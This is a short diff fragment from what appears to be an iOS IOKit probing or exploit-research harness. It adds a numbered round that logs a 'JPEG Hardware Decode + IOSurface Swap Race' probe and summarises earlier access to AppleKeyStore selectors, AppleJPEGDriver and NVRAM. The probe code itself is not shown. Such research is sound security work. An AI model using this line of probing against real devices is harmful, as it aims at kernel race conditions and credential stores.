     rlog("\n=== r317: Deep AppleKeyStore + AppleJPEGDriver + CredentialManager ===\n\n");
     fflush(stdout);
@@ -35787,6 +36446,13 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 318) {
+            rlog("*** rounds=318: JPEG Hardware Decode + IOSurface Swap Race ***\n");
+            rlog("  r317: KeyStore sel0/1/16 success, JPEG opens 5 types, NVRAM readable.\n");
+            rlog("  Probe: JPEG struct methods, IOSurface+JPEG decode, backing swap.\n\n");
+            r318_probe();
             goto done;
         }
         if (rounds == 317) {
